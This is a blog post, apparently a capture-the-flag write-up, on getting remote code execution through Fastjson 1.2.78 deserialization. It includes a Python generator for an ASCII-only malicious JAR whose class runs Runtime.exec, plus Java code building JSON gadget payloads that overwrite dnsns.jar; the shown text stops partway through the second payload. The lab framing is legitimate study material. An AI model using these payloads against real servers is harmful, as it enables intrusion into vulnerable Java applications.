@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Fastjson write ascii JAR RCE - p0l1st&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Fastjson write ascii JAR RCE - p0l1st&#39;s blog" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2026/03/08/Fastjson-write-ascii-JAR-RCE/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2026-03-08T07:40:19.000Z" />
+  
+  <meta property="og:article:author" content="p0l1st" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Blog</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="/friends" style="--index: 2">Friends</a>
+      
+      <a class="nav-item" href="/about" style="--index: 3">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/p0l1st" style="--index: 4"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 5"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2026-03-08T15:40:19+08:00">
+      March 8, 2026
+    </time>
+    
+
+    <h1 class="title">Fastjson write ascii JAR RCE</h1>
+  </div>
+
+  <div class="content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>@lu2ker师傅在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DdveJJ6XRulQkNgud9jf4w">Java Puzzle</a>投稿的题目</p>
+<blockquote>
+<h1 id="Fastjson-Decoder"><a href="#Fastjson-Decoder" class="headerlink" title="Fastjson Decoder"></a>Fastjson Decoder</h1><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>目标服务器运行着一个<code>Java Web</code>应用，使用了存在漏洞的<code>Fastjson</code>版本。</p>
+<p>你需要突破重重限制，最终获取到系统权限。</p>
+<p>请勿进行扫描爆破等操作</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地环境搭建：</p>
+<p>下载CVE-2022-25845-In-Spring-1.0-SNAPSHOT.jar、Dockerfile</p>
+<p>构建image</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t fj_test .</span><br></pre></td></tr></table></figure>
+
+<p>启动容器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8078:8078 &lt;image_id&gt;</span><br></pre></td></tr></table></figure>
+
+<p>请求<a target="_blank" rel="noopener" href="http://127.0.0.1:8078/json">http://127.0.0.1:8078/json</a></p>
+</blockquote>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>Controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(</span></span><br><span class="line"><span class="meta">        value = &#123;&quot;/json&quot;&#125;,</span></span><br><span class="line"><span class="meta">        consumes = &#123;&quot;application/json&quot;&#125;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vuln</span><span class="params">(<span class="meta">@RequestBody</span> String json)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(json);</span><br><span class="line">            <span class="keyword">return</span> parse;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Charset</span> <span class="variable">cs</span> <span class="operator">=</span> Charset.forName(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;err..&quot;</span>.getBytes(), cs);</span><br><span class="line">            <span class="keyword">return</span> err + <span class="string">&quot;:\n&quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依赖</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603081542384.png" alt="image-20260303221556836"></p>
+<p>commons-io 2.2 fastjson 1.2.78，那么就是一个spring fat jar写文件的利用了</p>
+<p>常见的写文件有以下几种利用方式</p>
+<ul>
+<li>计划任务</li>
+<li>SSH</li>
+<li>charsets.jar</li>
+<li>tomcat docbase</li>
+</ul>
+<p>前两个在目标环境中都不存在，并且由于写class和jar都有非UTF-8字符，那么往${docbase}&#x2F;WEB-INF&#x2F;classes&#x2F;路径下写入恶意类的方法也不行了</p>
+<blockquote>
+<p>在该docker环境中，fastjson反序列化io链创建<code>WriteOutputStream</code>实例时会调用其需要传递<code>decoder</code>参数的构造函数，导致公开的链子报空指针异常</p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603081542351.png" alt="image-20260308133751670"></p>
+<p>解决方法就是使用fastjson自带的”<code>com.alibaba.fastjson.util.UTF8Decoder</code>“来填充<code>decoder</code>参数</p>
+<p>即给<code>WriteOutputStream</code>设置上<code>decoder</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;decoder&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.util.UTF8Decoder&quot;&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里写文件的思路是@c0ny1师傅之前提过通过生成ascii jar的方法来写一个jar文件，但是目标环境中charsets.jar可能被提前加载</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="type">Charset</span> <span class="variable">cs</span> <span class="operator">=</span> Charset.forName(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;err..&quot;</span>.getBytes(), cs);</span><br><span class="line">    <span class="keyword">return</span> err + <span class="string">&quot;:\n&quot;</span> + e.getMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603081542514.png" alt="image-20260308135031769"></p>
+<p>只要触发异常就会被加载，因为是公共靶机，总会有人触发，所以就不能再覆盖charsets.jar</p>
+<p>那么找一个能够替代charsets.jar的jar包就可以了，这里就用<code>lib/ext</code>目录下的dnsns.jar，当然用nashorn.jar也是可以的</p>
+<h1 id="构造Exp"><a href="#构造Exp" class="headerlink" title="构造Exp"></a>构造Exp</h1><p>首先是要添加<code>InputStream</code>到缓存，然后爆破路径(docbase、jre)的，但是由于给了docker我们可以直接知道jre&#x2F;lib&#x2F;ext的绝对路径所以就不需要爆破了</p>
+<p>生成jar</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> compress <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">allow_bytes = []</span><br><span class="line">disallowed_bytes = [<span class="number">38</span>, <span class="number">60</span>, <span class="number">39</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">40</span>, <span class="number">41</span>]</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">in</span> disallowed_bytes:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    allow_bytes.append(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    padding_char = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">    raw_filename = <span class="string">&#x27;DNSNameServiceDescriptor.class&#x27;</span></span><br><span class="line">    zip_entity_filename = <span class="string">&#x27;sun/net/spi/nameservice/dns/DNSNameServiceDescriptor.class&#x27;</span></span><br><span class="line">    jar_filename = <span class="string">&#x27;ascii01_3.jar&#x27;</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        javaCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">package sun.net.spi.nameservice.dns;</span></span><br><span class="line"><span class="string">import sun.net.spi.nameservice.NameService;</span></span><br><span class="line"><span class="string">import sun.net.spi.nameservice.NameServiceDescriptor;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import java.io.IOException;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">public final class DNSNameServiceDescriptor extends Exception implements NameServiceDescriptor &#123;</span></span><br><span class="line"><span class="string">    private static final String paddingData = &quot;&#123;PADDING_DATA&#125;&quot;;</span></span><br><span class="line"><span class="string">    public DNSNameServiceDescriptor(String message) &#123;</span></span><br><span class="line"><span class="string">        try &#123;</span></span><br><span class="line"><span class="string">            Runtime.getRuntime().exec(message);</span></span><br><span class="line"><span class="string">        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="string">            e.printStackTrace();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public NameService createNameService() throws Exception &#123;</span></span><br><span class="line"><span class="string">        return null;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public String getProviderName() &#123;</span></span><br><span class="line"><span class="string">        return &quot;sun&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public String getType() &#123;</span></span><br><span class="line"><span class="string">        return &quot;dns&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        padding_data = padding_char * num</span><br><span class="line">        javaCode = javaCode.replace(<span class="string">&quot;&#123;PADDING_DATA&#125;&quot;</span>, padding_data)</span><br><span class="line"></span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&#x27;DNSNameServiceDescriptor.java&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        f.write(javaCode)</span><br><span class="line">        f.close()</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&quot;D:\\JavaEnviron\\jdk1.8.0_65\\bin\\javac.exe -nowarn -g:none -source 1.8 -target 1.8 -cp jasper.jar DNSNameServiceDescriptor.java&quot;</span>)</span><br><span class="line"></span><br><span class="line">        raw_data = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(raw_filename, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">        compressor = ASCIICompressor(<span class="built_in">bytearray</span>(allow_bytes))</span><br><span class="line">        compressed_data = compressor.compress(raw_data)[<span class="number">0</span>]</span><br><span class="line">        crc = zlib.crc32(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">        st_crc = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc)</span><br><span class="line">        st_raw_data = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">        st_compressed_data = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line">        st_cdzf = struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) + <span class="built_in">len</span>(zip_entity_filename) + <span class="number">0x1e</span>)</span><br><span class="line"></span><br><span class="line">        b_crc = isAllowBytes(st_crc, allow_bytes)</span><br><span class="line">        b_raw_data = isAllowBytes(st_raw_data, allow_bytes)</span><br><span class="line">        b_compressed_data = isAllowBytes(st_compressed_data, allow_bytes)</span><br><span class="line">        b_cdzf = isAllowBytes(st_cdzf, allow_bytes)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> b_crc <span class="keyword">and</span> b_raw_data <span class="keyword">and</span> b_compressed_data <span class="keyword">and</span> b_cdzf:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;</span>.<span class="built_in">format</span>(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))</span><br><span class="line">            output = <span class="built_in">open</span>(jar_filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            output.write(wrap_jar(raw_data, compressed_data, zip_entity_filename.encode()))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] Generate &#123;0&#125; success&#x27;</span>.<span class="built_in">format</span>(jar_filename))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] CRC:&#123;0&#125; RDL:&#123;1&#125; CDL:&#123;2&#125; CDAFL:&#123;3&#125; Padding data: &#123;4&#125;*&#123;5&#125;&#x27;</span>.<span class="built_in">format</span>(b_crc, b_raw_data, b_compressed_data, b_cdzf, num, padding_char))</span><br><span class="line">        num = num + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>然后分别发送poc1和poc2替换dnsns.jar</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.p0l1st;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_jackson_io_write_7_linux</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="string">&quot;D:\\Project\\PyProject\\JavaSec\\ascii-jar\\ascii01_3.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">outfile</span> <span class="operator">=</span> <span class="string">&quot;/usr/local/openjdk-8/jre/lib/ext/dnsns.jar&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(file));</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexString</span> <span class="operator">=</span> bytesToHexString(bytes);</span><br><span class="line">        System.out.println(bytes.length+<span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] array = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length+<span class="number">1</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">bss</span> <span class="operator">=</span> Arrays.toString(array);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;a\&quot;: \&quot;&#123;    \\\&quot;@type\\\&quot;: \\\&quot;java.lang.Exception\\\&quot;,    \\\&quot;@type\\\&quot;: \\\&quot;com.fasterxml.jackson.core.exc.InputCoercionException\\\&quot;,    \\\&quot;p\\\&quot;: &#123;    &#125;  &#125;\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;b\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;$ref\&quot;: \&quot;$.a.a\&quot;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;c\&quot;: \&quot;&#123;  \\\&quot;@type\\\&quot;: \\\&quot;com.fasterxml.jackson.core.JsonParser\\\&quot;,  \\\&quot;@type\\\&quot;: \\\&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\\&quot;,  \\\&quot;in\\\&quot;: &#123;&#125;&#125;\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;d\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;$ref\&quot;: \&quot;$.c.c\&quot;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#125;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;dd\&quot;:&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;java.util.Currency\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;val\&quot;:&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;currency\&quot;:&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;w\&quot;:&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;java.io.InputStream\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;:\&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;delegate\&quot;:&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.AutoCloseInputStream\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      \&quot;in\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;input\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          \&quot;@type\&quot;: \&quot;org.apache.commons.io.input.CharSequenceInputStream\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          \&quot;s\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;: \&quot;java.lang.String\&quot;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;&quot;</span> + hexString + <span class="string">&quot;\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;charset\&quot;: \&quot;UTF-8\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;bufferSize\&quot;: 1024\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &#125;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          \&quot;branch\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;: \&quot;org.apache.commons.io.output.WriterOutputStream2\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;writer\&quot;: &#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              \&quot;@type\&quot;: \&quot;org.apache.commons.io.output.LockableFileWriter\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              \&quot;file\&quot;: \&quot;&quot;</span> + outfile + <span class="string">&quot;\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              \&quot;encoding\&quot;: \&quot;UTF-8\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              \&quot;charset\&quot;: \&quot;UTF-8\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              \&quot;append\&quot;: false,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;decoder\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.alibaba.fastjson.util.UTF8Decoder\&quot;&#125;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;bufferSize\&quot;: 1024,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;writeImmediately\&quot;: true\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &#125;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          \&quot;closeBranch\&quot;: true\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &#125;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;include\&quot;:true,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;boms\&quot;:[&#123;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;org.apache.commons.io.ByteOrderMark\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;charsetName\&quot;: \&quot;UTF-8\&quot;,\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;bytes\&quot;:&quot;</span> + bss + <span class="string">&quot;\r\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &#125;]\r\n&quot;</span> 